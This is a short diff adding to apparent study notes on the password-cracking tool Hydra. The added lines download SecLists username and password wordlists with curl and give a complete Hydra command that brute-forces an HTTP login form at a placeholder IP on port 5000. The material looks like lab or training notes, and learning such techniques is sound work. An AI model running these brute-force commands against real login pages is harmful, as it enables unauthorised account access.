@@ -68,3 +68,8 @@ To use Hydra for the Authentication : `hydra -l basic-auth-user -P 2023-200_most
 `hydra [options] target http-post-form "path:params:condition_string"` : This is the template of the command.
 `hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=302"` : This is the example of the string and it tell us the success condition (`S=...`)
 
+Param-String : `/:username=^USER^&password=^PASS^:F=Invalid credentials`
+1. `curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt`
+2. `curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt`
+3. `hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f IP -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"`
+
